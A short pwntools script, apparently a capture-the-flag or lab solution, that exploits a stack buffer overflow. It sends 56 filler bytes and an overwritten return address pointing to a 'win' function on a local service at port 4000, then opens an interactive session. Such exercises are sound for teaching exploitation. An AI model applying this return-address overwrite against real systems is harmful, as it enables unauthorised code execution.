from pwn import *
r = remote('localhost', 4000)

offset = 56
win = 0x004011a2

payload = b'A' * offset
payload += p64(win)

r.sendline(payload)

r.interactive()
